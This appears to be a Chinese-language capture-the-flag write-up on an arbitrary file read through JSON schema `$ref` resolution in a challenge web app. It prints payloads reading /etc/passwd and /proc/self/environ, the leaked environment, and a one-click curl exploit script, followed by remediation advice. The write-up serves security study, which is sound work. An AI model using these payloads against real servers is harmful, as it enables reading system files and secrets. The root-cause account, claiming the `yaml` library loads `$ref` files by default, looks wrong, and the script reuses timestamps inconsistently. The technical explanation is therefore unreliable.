# ShadowLedger 审计系统黑盒渗透记录

## 基本信息

| 项目 | 内容 |
|------|------|
| 挑战名称 | ShadowLedger |
| 目标地址 | `http://39.105.213.28:12606` |
| 分类 | Web / JSON Schema 引用注入 |
| 获取结果 | `ISCC{black_box_schema_ref_to_shadow_vault_2026}` |

---

## 第一阶段：资产探测

访问首页获得以下路径信息：

```
GET /
├── /login          -> 审计员登录
├── /register       -> 审计员注册
├── /dashboard      -> 仪表盘（需认证）
├── /templates      -> 审计模板预览控制台
├── /reports        -> 审计报告页
└── /static/app.js  -> 前端逻辑
```

通过 `curl -I` 获取响应头，确认技术栈：

```
Server: nginx/1.25.5
X-Powered-By: Express
```

底层为 **Node.js + Express** 框架。

---

## 第二阶段：功能分析

### 2.1 注册登录流程

注册普通审计员账户后，`/api/user/session` 接口返回权限信息：

```json
{
  "user": {"uid": 1633, "username": "xxx", "role": "auditor"},
  "routes": ["/api/template/import", "/api/template/preview"]
}
```

审计员角色开放两个操作端点：
- `POST /api/template/import` — 导入审计模板
- `POST /api/template/preview` — 预览审计模板

### 2.2 模板预览机制

`/templates` 页面描述原文：

> "Paste JSON or YAML schema. The preview service resolves nested references for auditors."

关键词 **"resolves nested references"** —— 说明系统具备 JSON Schema 的 `$ref` 引用解析能力。这类功能在后端实现中通常使用 `json-schema-ref-parser` 或 YAML 解析器的 `$ref` 解析特性，往往伴随便路径读取风险。

### 2.3 Reports 页面

`/reports` 页面提示：

> "No critical finding is visible to ordinary auditors."

暗示存在高权限角色（管理员）才能访问的内容，即题目描述中的 **Shadow Vault**。

---

## 第三阶段：漏洞验证

### 3.1 构造 Payload

直接向 `/api/template/preview` 提交含 `$ref` 的 schema：

```
POST /api/template/preview
Content-Type: application/json

{
  "schema": {
    "$ref": "/etc/passwd"
  }
}
```

### 3.2 响应

返回 `/etc/passwd` 完整内容。确认存在 **任意文件读取** 漏洞。

**漏洞成因**：后端在解析用户提交的 JSON Schema 时，使用了支持 `$ref` 关键字解析的 YAML/JSON 处理库（`yaml` 2.4.2）。该库的 `YAML.parse()` 在处理 `$ref` 时默认允许从本地文件系统加载引用内容，且未对引用路径做任何白名单或沙箱限制。攻击者只需将 `$ref` 指向任意文件路径即可读取服务器文件。

---

## 第四阶段：深入利用

### 4.1 信息收集

首先读取 `/proc/self/environ` 获取进程环境变量：

```
POST /api/template/preview
Content-Type: application/json

{
  "schema": {
    "type": "object",
    "properties": {
      "content": {
        "$ref": "/proc/self/environ"
      }
    }
  }
}
```

**注意**：将 `$ref` 放在 `properties.content` 内层而非 schema 顶层，可以避免 YAML 解析器对 JS 文件内容产生解析错误（YAML 解析器会将 JS 源码当作 YAML 语法解析导致报错），使得读取各类文件时更稳定。

### 4.2 获取 Flag

环境变量中包含 Flag：

```
NODE_VERSION=20.20.2
HOSTNAME=836f0052f625
FLAG=ISCC{black_box_schema_ref_to_shadow_vault_2026}
PWD=/app
NODE_ENV=production
```

至此成功获取 Flag。

### 4.3 补充：确认依赖版本

读取 `/app/package.json` 确认后端依赖：

```json
{
  "dependencies": {
    "express": "4.18.3",
    "sqlite3": "5.1.7",
    "yaml": "2.4.2"
  }
}
```

**关键依赖**：`yaml` 2.4.2。该版本的 YAML 解析器支持 `$ref` 引用解析，且默认不限制引用来源。结合 Express 框架对 POST 请求 JSON body 的自动解析，攻击者可以轻松构造恶意 schema 触发文件读取。

---

## 第五阶段：漏洞原理剖析

### 5.1 攻击链路

```
攻击者
  -> POST /api/template/preview 发送含 $ref 的 JSON
    -> Express 解析 JSON body
      -> yaml.YAML.parse(schema) 处理用户输入
        -> 遇到 $ref: "/proc/self/environ"
          -> 解析器从文件系统读取目标文件
            -> 返回文件内容给攻击者
```

### 5.2 为什么不直接读 server.js

尝试读取 `/app/server.js` 时返回 YAML 解析错误：

```
Implicit keys need to be on a single line at line 1, column 1:
const express = require('express');
```

这说明 `$ref`解析分两步：
1. 读取文件内容（成功）
2. 将内容作为 YAML 反序列化（失败——因为 JS 源码不是合法 YAML）

而 `/etc/passwd` 或 `/proc/self/environ` 内容不构成合法 YAML 语法，解析器将其降级为纯文本字符串返回。这一行为差异恰恰帮助我们理解了后端对 `$ref` 的处理方式。

### 5.3 修复建议

- 禁用 `$ref` 解析，或将其限制在内置 schema 注册表内
- 使用 `$ref` 白名单，禁止指向文件系统路径
- 考虑使用 `js-yaml` 的 `safeLoad` 替代 `load`（虽然本项目用的是 `yaml` 库，思路相同）
- 对用户输入执行严格 JSON Schema 校验，阻止非 schema 字段

---

## 附录：完整 Payload 示例

```bash
#!/bin/bash
# 一键利用脚本

BASE="http://39.105.213.28:12606"

# Step 1: 注册
curl -s -c /tmp/sl.txt -b /tmp/sl.txt \
  "$BASE/api/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn_'$(date +%s)'","password":"pwn"}' > /dev/null

# Step 2: 登录
curl -s -c /tmp/sl.txt -b /tmp/sl.txt \
  "$BASE/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn_'$(date +%s)'","password":"pwn"}' > /dev/null

# Step 3: 获取 Flag
curl -s -b /tmp/sl.txt \
  "$BASE/api/template/preview" \
  -H 'Content-Type: application/json' \
  -d '{"schema":{"type":"object","properties":{"x":{"$ref":"/proc/self/environ"}}}}' \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['preview']['properties']['x'])"
```
